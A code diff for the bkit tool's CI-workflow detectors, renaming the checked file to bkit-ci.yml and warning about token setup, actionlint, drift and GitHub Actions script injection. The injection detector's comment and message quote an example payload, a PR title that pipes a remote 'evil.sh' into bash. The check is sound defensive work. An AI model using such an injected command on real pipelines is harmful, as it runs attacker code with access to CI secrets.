@@ -7,8 +7,8 @@ import * as path from "node:path";
 // Other post-install detectors
 // ---------------------------------------------------------------------------
 /**
- * Detect whether the ci.yml install step is wired to authenticate to GH Packages.
- * Returns null if no ci.yml, no `pnpm install` step, or the step is correctly wired
+ * Detect whether the bkit-ci.yml install step is wired to authenticate to GH Packages.
+ * Returns null if no bkit-ci.yml, no `pnpm install` step, or the step is correctly wired
  * (no false positives).
  *
  * On pnpm >=10.34.3 the correct shape requires BOTH:
@@ -21,7 +21,7 @@ import * as path from "node:path";
  * (writes already happened).
  */
 export function detectCiYmlMissingTokenEnv(cwd) {
-    const ciPath = path.join(cwd, ".github", "workflows", "ci.yml");
+    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
     if (!fs.existsSync(ciPath))
         return null;
     const content = fs.readFileSync(ciPath, "utf-8");
@@ -55,9 +55,9 @@ export function detectCiYmlMissingTokenEnv(cwd) {
         id: "ci-yml-missing-token-env",
         severity: npmrcUsesGhPackages ? "blocker" : "advisory",
         detect: npmrcUsesGhPackages
-            ? `.github/workflows/ci.yml has a pnpm install step but is missing ${missingText}, and .npmrc authenticates to the GitHub Packages registry. The next CI run will 401 on the @cbartens/bkit download.`
-            : `.github/workflows/ci.yml has a pnpm install step but is missing ${missingText}.`,
-        action: "Update the install step in .github/workflows/ci.yml to write the auth token into pnpm's user-level config BEFORE install:\n\n" +
+            ? `.github/workflows/bkit-ci.yml has a pnpm install step but is missing ${missingText}, and .npmrc authenticates to the GitHub Packages registry. The next CI run will 401 on the @cbartens/bkit download.`
+            : `.github/workflows/bkit-ci.yml has a pnpm install step but is missing ${missingText}.`,
+        action: "Update the install step in .github/workflows/bkit-ci.yml to write the auth token into pnpm's user-level config BEFORE install:\n\n" +
             "    - name: Install Dependencies\n" +
             "      run: |\n" +
             '        pnpm config set "//npm.pkg.github.com/:_authToken=$BKIT_GH_TOKEN_INSTALL"\n' +
@@ -102,23 +102,23 @@ export function detectBkitCloudYmlAlwaysTrueGate(cwd) {
     };
 }
 /**
- * Matches a `.github/workflows/ci.yml` copied from bkit's ci.yml template: an uncommented
+ * Matches a `.github/workflows/bkit-ci.yml` copied from the bkit-ci.yml template: an uncommented
  * job named `bkit-tests` or `bkit-tests-<lane>`, the job names every lane of the template
  * carries.
  */
 const ADOPTED_CI_JOB_RE = /^[ \t]+bkit-tests(?:-[\w-]+)?:[ \t]*$/m;
 /**
- * Detect a `.github/workflows/ci.yml` adopted from bkit's template with no `actionlint` step.
+ * Detect a `.github/workflows/bkit-ci.yml` adopted from bkit's template with no `actionlint` step.
  * `yaml.safe_load` (and generic YAML linters) accept workflows that are valid YAML
  * but invalid GitHub Actions (doubled quotes inside ${{ }}, always-true `if:` block
  * scalars). actionlint is GHA-aware and catches that class.
  *
- * Only fires when the consumer adopted bkit's ci.yml template (ADOPTED_CI_JOB_RE).
- * ci.yml is the consumer's file, so `bkit install` never adds the step — the action
+ * Only fires when the consumer adopted the bkit-ci.yml template (ADOPTED_CI_JOB_RE).
+ * bkit-ci.yml is the consumer's file, so `bkit install` never adds the step — the action
  * inlines the manual step.
  */
 export function detectCiYmlMissingActionlint(cwd) {
-    const ciPath = path.join(cwd, ".github", "workflows", "ci.yml");
+    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
     if (!fs.existsSync(ciPath))
         return null;
     const content = fs.readFileSync(ciPath, "utf-8");
@@ -129,8 +129,8 @@ export function detectCiYmlMissingActionlint(cwd) {
     return {
         id: "ci-yml-missing-actionlint",
         severity: "advisory",
-        detect: ".github/workflows/ci.yml (adopted from bkit's template) has no actionlint step. yaml.safe_load accepts workflows that are valid YAML but invalid GitHub Actions (e.g. doubled quotes inside ${{ }}, an always-true `if:` block scalar); actionlint is GHA-aware and catches them.",
-        action: "Add an actionlint step among the static checks in .github/workflows/ci.yml (before the test/build group):\n\n" +
+        detect: ".github/workflows/bkit-ci.yml (adopted from bkit's template) has no actionlint step. yaml.safe_load accepts workflows that are valid YAML but invalid GitHub Actions (e.g. doubled quotes inside ${{ }}, an always-true `if:` block scalar); actionlint is GHA-aware and catches them.",
+        action: "Add an actionlint step among the static checks in .github/workflows/bkit-ci.yml (before the test/build group):\n\n" +
             "      - name: Run actionlint\n" +
             "        if: steps.cache.outputs.skip != 'true'\n" +
             "        run: |\n" +
@@ -141,22 +141,22 @@ export function detectCiYmlMissingActionlint(cwd) {
 }
 /**
  * Detect an untrusted GitHub Actions expression interpolated directly into a `run:` shell
- * body in `.github/workflows/ci.yml` — the classic GHA script-injection sink. A PR titled
+ * body in `.github/workflows/bkit-ci.yml` — the classic GHA script-injection sink. A PR titled
  * `"; curl evil.sh | bash; "` expands into the runner's shell when `${{ github.event.* }}`
  * (or `github.head_ref`) is inlined into `run:` text. The safe form is env-indirection: map
  * the value to an `env:` var and reference `$VAR` (GitHub runtime-expands env values and never
- * re-parses them as shell). ci.yml is the consumer's file — bkit's template was hardened but
+ * re-parses them as shell). bkit-ci.yml is the consumer's file — bkit's template was hardened but
  * nothing back-fills a copy adopted before the fix, so it keeps the vulnerable inline form.
  * This surfaces it as a dedicated security finding.
  *
- * Line-based (no YAML dep, like the sibling ci.yml detectors): tracks `run:` blocks by
+ * Line-based (no YAML dep, like the sibling bkit-ci.yml detectors): tracks `run:` blocks by
  * indentation and flags untrusted expressions inside their bodies only. `env:` / `if:` /
  * `with:` / `concurrency:` contexts are NOT run bodies, so the safe env-indirection form does
  * not fire; a YAML-commented `run:` key never opens a body, so shipped commented stubs stay
- * silent. Only scans a ci.yml adopted from bkit's template (ADOPTED_CI_JOB_RE).
+ * silent. Only scans a bkit-ci.yml adopted from bkit's template (ADOPTED_CI_JOB_RE).
  */
 export function detectCiYmlRunInjection(cwd) {
-    const ciPath = path.join(cwd, ".github", "workflows", "ci.yml");
+    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
     if (!fs.existsSync(ciPath))
         return null;
     const content = fs.readFileSync(ciPath, "utf-8");
@@ -209,7 +209,7 @@ export function detectCiYmlRunInjection(cwd) {
     return {
         id: "ci-yml-run-injection",
         severity: "advisory",
-        detect: "SECURITY: .github/workflows/ci.yml interpolates untrusted GitHub Actions input " +
+        detect: "SECURITY: .github/workflows/bkit-ci.yml interpolates untrusted GitHub Actions input " +
             "(github.event.* / github.head_ref) directly into a run: shell body — a script-injection " +
             'sink. A PR title or branch name like `"; curl evil.sh | bash; "` then runs on your CI ' +
             `runner (which holds GITHUB_TOKEN):\n${shown}${more}`,
@@ -221,22 +221,22 @@ export function detectCiYmlRunInjection(cwd) {
             "      run: |\n" +
             '        MSG="$PR_TITLE"   # NOT MSG="${{ github.event.pull_request.title }}"\n\n' +
             "Apply the same env-indirection to every flagged line (github.event.*, github.head_ref). " +
-            "bkit's current ci.yml template already uses this form — re-sync the affected steps from " +
-            ".bkit/templates/.github/workflows/ci.yml if you adopted it before the hardening.",
+            "bkit's current bkit-ci.yml template already uses this form — re-sync the affected steps from " +
+            ".bkit/templates/.github/workflows/bkit-ci.yml if you adopted it before the hardening.",
     };
 }
 /**
  * Detect drift of the consumer's `bkit-tests-check` capstone from bkit's canonical
- * CI contract. ci.yml is the consumer's copy of a template; bkit never rewrites it.
+ * CI contract. bkit-ci.yml is the consumer's copy of a template; bkit never rewrites it.
  * WARNING-ONLY presence check: flags the ABSENCE of a known-good fragment, never
- * "differs from canonical". Fires when ci.yml defines a bkit-tests-check job (the
+ * "differs from canonical". Fires when bkit-ci.yml defines a bkit-tests-check job (the
  * template ships one).
  *
  * Every check reads `code` (full-line comments stripped): the template's commented
  * scaffold reference names `bkit-tests-check`, `!cancelled()` and `live_ran`.
  */
 export function detectCiYmlCapstoneContractDrift(cwd) {
-    const ciPath = path.join(cwd, ".github", "workflows", "ci.yml");
+    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
     if (!fs.existsSync(ciPath))
         return null;
     const content = fs.readFileSync(ciPath, "utf-8");
@@ -275,16 +275,16 @@ export function detectCiYmlCapstoneContractDrift(cwd) {
     return {
         id: "ci-yml-capstone-contract-drift",
         severity: "advisory",
-        detect: `.github/workflows/ci.yml (adopted from bkit's template) has a bkit-tests-check capstone missing ${missing.length} ` +
-            "load-bearing invariant(s) from bkit's canonical CI contract. ci.yml is yours to own, so bkit can't rewrite it — this is a heads-up, not a hard failure.",
-        action: "Consider restoring these to keep `green == validated` (see the FULL CI SCAFFOLD REFERENCE in the bkit ci.yml template):\n\n" +
+        detect: `.github/workflows/bkit-ci.yml (adopted from bkit's template) has a bkit-tests-check capstone missing ${missing.length} ` +
+            "load-bearing invariant(s) from bkit's canonical CI contract. bkit-ci.yml is yours to own, so bkit can't rewrite it — this is a heads-up, not a hard failure.",
+        action: "Consider restoring these to keep `green == validated` (see the FULL CI SCAFFOLD REFERENCE in the bkit bkit-ci.yml template):\n\n" +
             missing.map((m) => "  - " + m).join("\n"),
     };
 }
 // Tag-gated tiers invoked via a per-package script: a tagged test whose owning package
 // declares no matching script is silently skipped by `turbo run <script>` (exits 0) —
 // the tag is dead and the tier ghost-greens. Suffix-based tiers (integration via
-// *.integration.test.ts) are covered by the ci.yml template's own missing-script warning.
+// *.integration.test.ts) are covered by the bkit-ci.yml template's own missing-script warning.
 const TAG_SCRIPT_HOMES = [
     { tag: "@live", script: "test:live" },
     { tag: "@smoke", script: "test:smoke" },
@@ -610,7 +610,7 @@ export function detectTestIntegrationEnv(cwd) {
         id: "test-integration-env-not-asserted",
         severity: "advisory",
         detect: "`package.json#scripts.test:integration` exists, but no real-service env gating (TEST_REAL_APIS, SUPABASE_SERVICE_ROLE, service-role URL, or a `supabase start` chain) was found in the script, the CI workflow lane that runs it, or the vitest integration config.",
-        action: "Confirm integration tests actually exercise real services — otherwise the CI integration step (your own, or the one in bkit's ci.yml template once adopted) is a no-op (KN-23 false-confidence loop). Provision the real-service env at ANY one of these layers (all are recognised):\n\n" +
+        action: "Confirm integration tests actually exercise real services — otherwise the CI integration step (your own, or the one in bkit's bkit-ci.yml template once adopted) is a no-op (KN-23 false-confidence loop). Provision the real-service env at ANY one of these layers (all are recognised):\n\n" +
             '  - script: "test:integration": "TEST_REAL_APIS=true SUPABASE_URL=$SUPABASE_DEV_URL vitest run --config=vitest.integration.config.ts"\n' +
             "  - CI lane: set `TEST_REAL_APIS` / export the service-role URL / chain `supabase start` around `turbo run test:integration` in the `.github/workflows/*.yml` job that runs it (keeps local `pnpm test:integration` env-agnostic)\n" +
             "  - vitest integration config: document/enforce the per-file `TEST_REAL_APIS` guard in the config the script `--config`s to.",
@@ -655,30 +655,30 @@ export function detectGhaFloatingTags(cwd) {
 }
 /**
  * Detect whether the consumer composed a gate on bkit's `Detect Direct Push` step
- * outputs (`should_force_build` / `should_run_full`). The bkit ci.yml ships these
+ * outputs (`should_force_build` / `should_run_full`). The bkit-ci.yml template ships these
  * primitives only — without a consumer-side gate reading the outputs, the force-tag
  * system documented in deployments.md is documentation-only.
  *
  * "Composition" = a `steps.detect.outputs.should_*` READ on an uncommented line, in a
- * sibling workflow or in ci.yml itself. bkit's shipped steps only SET these outputs and
+ * sibling workflow or in bkit-ci.yml itself. bkit's shipped steps only SET these outputs and
  * the example E2E gate ships commented (`bkit-stub:e2e`), so neither false-positives.
  */
 export function detectRunLevelsNotComposed(cwd) {
-    const ciPath = path.join(cwd, ".github", "workflows", "ci.yml");
+    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
     if (!fs.existsSync(ciPath))
         return null;
     const ciContent = fs.readFileSync(ciPath, "utf-8");
-    // Bkit ci.yml ships the `Detect Direct Push` step — if absent, no primitives to compose.
+    // Bkit's bkit-ci.yml ships the `Detect Direct Push` step — if absent, no primitives to compose.
     if (!ciContent.includes("Detect Direct Push"))
         return null;
     const workflowsDir = path.join(cwd, ".github", "workflows");
     // A consumer "composes" run-levels by READING bkit's force-tag outputs in a gate
-    // (`steps.detect.outputs.should_*`). bkit's own shipped ci.yml only SETS those outputs
+    // (`steps.detect.outputs.should_*`). bkit's own shipped bkit-ci.yml only SETS those outputs
     // (`echo "should_force_build=true" >> $GITHUB_OUTPUT`) and gates internal steps on
     // `cache.outputs.skip` — neither is consumer composition. So we look for the READ form,
     // on uncommented lines only (the shipped `bkit-stub:e2e` block reads the outputs but is
     // commented out by default — enabling it correctly counts as composition).
-    // ci.yml is the consumer's file, so matching the read form is what distinguishes a
+    // bkit-ci.yml is the consumer's file, so matching the read form is what distinguishes a
     // consumer gate.
     const readTokens = [
         "steps.detect.outputs.should_force_build",
@@ -692,14 +692,14 @@ export function detectRunLevelsNotComposed(cwd) {
     for (const entry of fs.readdirSync(workflowsDir, { withFileTypes: true })) {
         if (!entry.isFile() || !/\.ya?ml$/.test(entry.name))
             continue;
-        if (entry.name === "ci.yml")
+        if (entry.name === "bkit-ci.yml")
             continue; // checked below
         if (composesRunLevels(fs.readFileSync(path.join(workflowsDir, entry.name), "utf-8"))) {
             composed = true;
             break;
         }
     }
-    // Or a consumer-added gate inside ci.yml itself (e.g. an enabled bkit-stub:e2e block,
+    // Or a consumer-added gate inside bkit-ci.yml itself (e.g. an enabled bkit-stub:e2e block,
     // or a deploy/job step reading the outputs).
     if (!composed && composesRunLevels(ciContent))
         composed = true;
@@ -708,11 +708,11 @@ export function detectRunLevelsNotComposed(cwd) {
     return {
         id: "run-levels-not-composed",
         severity: "advisory",
-        detect: ".github/workflows/ci.yml ships bkit's `Detect Direct Push` step outputs (`should_force_build`, `should_run_full`, `cache.outputs.skip`) but no consumer-side workflow or step gates on them.",
+        detect: ".github/workflows/bkit-ci.yml ships bkit's `Detect Direct Push` step outputs (`should_force_build`, `should_run_full`, `cache.outputs.skip`) but no consumer-side workflow or step gates on them.",
         action: "`docs/deployments.md` documents bkit's none / partial / full run-level shape — the matrix is documentation-only until you compose at least one consumer-side gate. Examples:\n\n" +
             "  - A deploy job: `if: steps.detect.outputs.should_force_build == 'true' || github.ref == 'refs/heads/main'`\n" +
             "  - An E2E job: enable the `bkit-stub:e2e` block (which already gates on `should_run_full`).\n" +
             "  - A smoke workflow: copy the `bkit-stub:smoke` block to `.github/workflows/smoke.yml`.\n\n" +
-            "If your consumer doesn't need run-level tiers (single-track CI, no preview deploys), dismiss by removing the `Detect Direct Push` step from ci.yml. Note this also disables `[force cache]` / `[force build]` / `[force full]` tag detection.",
+            "If your consumer doesn't need run-level tiers (single-track CI, no preview deploys), dismiss by removing the `Detect Direct Push` step from bkit-ci.yml. Note this also disables `[force cache]` / `[force build]` / `[force full]` tag detection.",
     };
 }
